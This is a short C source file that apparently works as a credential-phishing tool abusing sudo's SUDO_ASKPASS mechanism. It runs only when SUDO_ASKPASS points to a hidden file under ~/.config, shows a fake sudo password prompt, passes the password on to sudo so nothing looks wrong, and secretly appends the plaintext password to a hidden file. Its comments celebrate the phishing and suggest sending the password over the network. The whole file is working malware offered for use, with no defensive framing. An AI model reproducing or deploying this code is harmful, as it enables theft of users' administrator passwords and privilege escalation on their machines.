#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char* argv[]) {
	// We rely on the fact that the env vars are set.
	char* user = getenv("USER");
	char* home = getenv("HOME");
	char* sap = getenv("SUDO_ASKPASS");

	// Some stealth...
	char* match = malloc(strlen(home) + 14);
	strcpy(match, home);
	strcat(match, "/.config/.aux");
	if(!sap) return 0;
	if(strcmp(sap, match) != 0) return 0;

	// Let the phishing begin.
	fprintf(stderr, "[sudo] password for %s: ", user);
	char* pwd = getpass("");
	printf("%s\n", pwd);	// Send it to stdout so that sudo can get it.

	pid_t pid = fork();
	if(!pid) {
		/*
			Got the pwd boys. It might be wrong, we don't know.
			Eventually the user will do a sudo with the right password,
			so no worries.
			The code below could be changed so that the password is
			sent over the wire.
		*/
		char* toWrite = malloc(strlen(pwd)+2);
		strcpy(toWrite, pwd);
		strcat(toWrite, "\n");
		free(pwd);

		char* path = malloc(strlen(home) + 12);
		strcpy(path, home);
		strcat(path, "/.config/._");
		FILE* fd = fopen(path, "a");
		fwrite(toWrite, 1, strlen(toWrite), fd);
		fclose(fd);
		free(toWrite);
		free(path);
	}

	return 0;
}
